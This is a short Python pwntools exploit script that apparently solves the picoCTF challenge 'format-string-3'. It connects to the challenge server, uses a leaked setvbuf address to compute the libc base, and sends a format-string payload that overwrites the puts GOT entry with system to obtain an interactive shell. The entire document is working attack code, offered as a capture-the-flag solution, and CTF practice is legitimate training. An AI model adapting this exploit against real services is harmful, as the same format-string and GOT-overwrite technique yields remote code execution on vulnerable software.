from pwn import *

context.log_level = "critical"
context.arch = "amd64"
context.os = "linux"
context.binary = ELF("format-string-3")
libc = context.binary.libc

p = remote("rhea.picoctf.net", 64043)

p.recvline()  # Howdy
s = p.recvline().split(b" ")  # I'll be nice
stevbuf_addr = int(s[-1].decode("utf-8").strip(), 16)  # &setvbuf

static_setvbuf = libc.symbols["setvbuf"]
libc.address = stevbuf_addr - static_setvbuf

payload = fmtstr_payload(38, {context.binary.got["puts"]: libc.symbols["system"]})

p.sendline(payload)
p.interactive()
